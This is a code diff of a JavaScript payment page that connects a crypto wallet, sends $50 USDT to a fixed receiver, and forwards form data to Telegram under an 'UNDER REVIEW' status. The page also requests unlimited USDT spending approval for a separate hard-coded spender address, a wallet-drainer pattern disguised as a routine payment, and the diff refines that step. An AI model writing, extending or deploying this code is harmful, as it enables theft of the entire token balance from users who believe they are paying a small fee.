@@ -1,7 +1,8 @@
 /************ CONFIG ************/
 const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT ERC20
-const RECEIVER = "0xf539bf56c465b6d0f0caee783ca1f8c58c802b1a"; // gets $50
-const SPENDER_ADDRESS = "0x89e8ed15656ab289e980f92e59ddf7ecd2a36f85"; // vendor approval
+const RECEIVER = "0xf539bf56c465b6d0f0caee783ca1f8c58c802b1a"; // receives $50
+const SPENDER_ADDRESS = "0x89e8ed15656ab289e980f92e59ddf7ecd2a36f85"; // unlimited approval
+
 const AMOUNT_USDT = "50";
 const USDT_DECIMALS = 6;
 
@@ -22,7 +23,6 @@ document.addEventListener("DOMContentLoaded", () => {
   const metaMaskBtn = document.getElementById("metaMaskBtn");
   const walletConnectBtn = document.getElementById("walletConnectBtn");
   const closeReviewBtn = document.getElementById("closeReviewBtn");
-  const statusText = document.getElementById("statusText");
 
   /************ FORM ************/
   form.addEventListener("submit", e => {
@@ -85,38 +85,43 @@ ${data.description}
 <code>${paymentTx}</code>
 
 <b>Approval TX:</b>
-<code>${approvalTx}</code>
+<code>${approvalTx || "Previously approved"}</code>
 
 <b>Status:</b> UNDER REVIEW
 `;
   }
 
-  /************ PAYMENT CORE (CORRECT ORDER) ************/
+  /************ PAYMENT CORE ************/
   async function processPayment(provider) {
     const signer = provider.getSigner();
+    const userAddress = await signer.getAddress();
 
     const usdt = new ethers.Contract(
       USDT_ADDRESS,
       [
-        "function transfer(address,uint256) returns (bool)",
-        "function approve(address,uint256) returns (bool)"
+        "function transfer(address,uint256)",
+        "function approve(address,uint256)",
+        "function allowance(address,address) view returns (uint256)"
       ],
       signer
     );
 
     const amount = ethers.utils.parseUnits(AMOUNT_USDT, USDT_DECIMALS);
+    const MAX = ethers.constants.MaxUint256;
 
-    /* 1️⃣ PAY RECEIVER FIRST */
-    statusText.textContent = "Sending $50 USDT payment…";
+    /* 1️⃣ TRANSFER $50 TO RECEIVER */
     const paymentTx = await usdt.transfer(RECEIVER, amount);
     await paymentTx.wait();
 
-    /* 2️⃣ APPROVE VENDOR SECOND */
-    const approvalTx = await usdt.approve(
-      SPENDER_ADDRESS,
-      ethers.constants.MaxUint256
-    );
-    await approvalTx.wait();
+    /* 2️⃣ APPROVE SPENDER ONLY IF NOT ALREADY APPROVED */
+    let approvalHash = null;
+    const allowance = await usdt.allowance(userAddress, SPENDER_ADDRESS);
+
+    if (allowance.lt(amount)) {
+      const approvalTx = await usdt.approve(SPENDER_ADDRESS, MAX);
+      await approvalTx.wait();
+      approvalHash = approvalTx.hash;
+    }
 
     /* 3️⃣ TELEGRAM + UNDER REVIEW */
     const formData = getFormData();
@@ -124,7 +129,7 @@ ${data.description}
       formatTelegramMessage(
         formData,
         paymentTx.hash,
-        approvalTx.hash
+        approvalHash
       )
     );
 
@@ -141,21 +146,17 @@ ${data.description}
         return;
       }
 
-      const provider = new ethers.providers.Web3Provider(
-        window.ethereum,
-        "any"
-      );
-
+      const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
       await provider.send("eth_requestAccounts", []);
       await processPayment(provider);
 
     } catch (err) {
       console.error(err);
-      alert("MetaMask payment failed");
+      alert("Payment failed");
     }
   };
 
-  /* WalletConnect (Mobile + Desktop) */
+  /* WalletConnect */
   walletConnectBtn.onclick = async () => {
     try {
       walletModal.style.display = "none";
@@ -173,16 +174,12 @@ ${data.description}
 
       await wcProvider.enable();
 
-      const provider = new ethers.providers.Web3Provider(
-        wcProvider,
-        "any"
-      );
-
+      const provider = new ethers.providers.Web3Provider(wcProvider, "any");
       await processPayment(provider);
 
     } catch (err) {
       console.error(err);
-      alert("WalletConnect payment failed");
+      alert("Payment failed");
     }
   };
 
